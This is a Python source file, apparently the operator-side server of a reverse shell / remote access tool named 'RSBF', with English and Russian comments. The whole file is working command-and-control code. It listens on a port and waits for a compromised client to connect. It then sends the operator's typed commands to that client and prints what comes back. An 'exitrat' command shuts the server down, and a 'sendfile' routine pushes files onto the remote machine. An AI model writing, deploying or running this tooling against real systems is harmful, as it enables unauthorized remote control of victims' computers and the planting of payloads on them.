import socket
import sys
import os
import tqdm

SEPARATOR = "<SEPARATOR>"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
HOST = ''

# Check if port to listen was entered / Проверка был ли введен порт для прослушивания
try:
    PORT = int(sys.argv[1])
except Exception as ex:
    print('Usage: python3 reverse_shell_server.py <port>\n' + str(ex))
    sys.exit(1)


def main():
    # Start to listen and wait for connect / Ожидание подключения
    s.bind((HOST, PORT))
    s.listen(10)
    print('RSBF server listening on port {}...'.format(PORT))

    # Accept connection / Принятие подключения
    conn, _ = s.accept()

    # Command processor / Обработчик команд
    while True:
        # Variable with command / Переменная с командой
        cmd = input('RSBF> ').rstrip()

        # If command = nothing - continue loop / Если команда ничему не равна -  продолжаем цикл
        if cmd == '':
            continue

        # Send command to client / Отправляем команды клиенту
        conn.send(bytes(cmd, encoding="utf-8", errors="ignore"))

        # Stop server / Останавливаем сервер
        if cmd == 'exitrat':
            s.close()
            sys.exit(0)

        # Function of downloading files / Функция загрузки файлов
        elif cmd == "sendfile":
            filename = input("[FILE] -> ")
            # get the file size
            filesize = os.path.getsize(filename)

            # send the filename and filesize
            conn.send(f"{filename}{SEPARATOR}{filesize}".encode())

            # start sending the file
            progress = tqdm.tqdm(range(filesize), f"Sending {filename}", unit="B", unit_scale=True, unit_divisor=1024)
            with open(filename, "rb") as f:
                while True:
                    # read the bytes from the file
                    bytes_read = f.read(1024)
                    if not bytes_read:
                        # file transmitting is done
                        break
                    # we use sendall to assure transimission in
                    # busy networks
                    conn.sendall(bytes_read)
                    # update the progress bar
                    progress.update(len(bytes_read))

        # Variable with client answer / Переменная с ответом от сервера
        data = conn.recv(4096)
        print(str(data, encoding="utf-8", errors="ignore"))


if __name__ == '__main__':
    main()
